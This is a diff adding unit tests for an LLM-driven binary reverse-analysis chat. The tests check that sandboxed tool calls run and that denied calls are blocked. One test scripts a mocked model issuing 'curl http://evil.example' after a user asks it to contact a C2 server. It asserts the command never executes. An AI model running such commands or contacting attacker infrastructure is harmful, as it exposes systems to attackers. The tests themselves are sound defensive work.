@@ -313,6 +313,56 @@ class ReverseAnalysisTests(unittest.IsolatedAsyncioTestCase):
             ["chat.started", "chat.tool_executed", "chat.completed"],
         )
 
+    async def test_chat_executes_shorthand_tool_calls_instead_of_echoing_them(self) -> None:
+        project, artifact_id = self.project_with_artifact()
+        run = ReverseRun(
+            id=str(uuid.uuid4()), project_id=project.id, status="completed",
+            provider="ollama", model="snapshot-model", report_markdown="# Report",
+        )
+        with get_reverse_session() as db:
+            db.add(run)
+            db.commit()
+        provider = _Provider([
+            json.dumps([{"run_cmd": f"strings /workspace/inputs/{artifact_id}"}]),
+            "CHAT COMPLETE: The binary embeds a hardcoded staging URL.",
+        ])
+        manager = ReverseAnalysisManager()
+        with (
+            patch("app.reverse.analysis.load_config", return_value=self.cfg),
+            patch("app.reverse.analysis.get_provider", return_value=provider),
+            patch("app.reverse.analysis.sandbox_manager.execute", return_value={
+                "success": True, "stdout": "http://stage.example", "stderr": "", "returncode": 0,
+            }) as execute,
+        ):
+            reply = await manager.chat(project.id, "Find exposed URLs")
+        execute.assert_called_once()
+        self.assertEqual(execute.call_args.args[1].cmd[0], "strings")
+        self.assertEqual(reply.content, "The binary embeds a hardcoded staging URL.")
+        self.assertEqual(reply.metadata_json["tool_uses"], 1)
+
+    async def test_chat_never_stores_a_raw_tool_call_as_the_answer(self) -> None:
+        project, _artifact_id = self.project_with_artifact()
+        run = ReverseRun(
+            id=str(uuid.uuid4()), project_id=project.id, status="completed",
+            provider="ollama", model="snapshot-model", report_markdown="# Report",
+        )
+        with get_reverse_session() as db:
+            db.add(run)
+            db.commit()
+        denied = json.dumps([{"tool": "run_cmd", "cmd": ["curl", "http://evil.example"]}])
+        provider = _Provider([denied, denied, denied])
+        manager = ReverseAnalysisManager()
+        with (
+            patch("app.reverse.analysis.load_config", return_value=self.cfg),
+            patch("app.reverse.analysis.get_provider", return_value=provider),
+            patch("app.reverse.analysis.sandbox_manager.execute") as execute,
+        ):
+            reply = await manager.chat(project.id, "Contact the C2 server")
+        execute.assert_not_called()
+        self.assertNotIn("curl", reply.content)
+        self.assertNotIn("{", reply.content)
+        self.assertIn("stopped before reaching a final answer", reply.content)
+
     async def test_cancelled_chat_never_leaves_project_stuck_in_chatting(self) -> None:
         project, _artifact_id = self.project_with_artifact()
         run = ReverseRun(
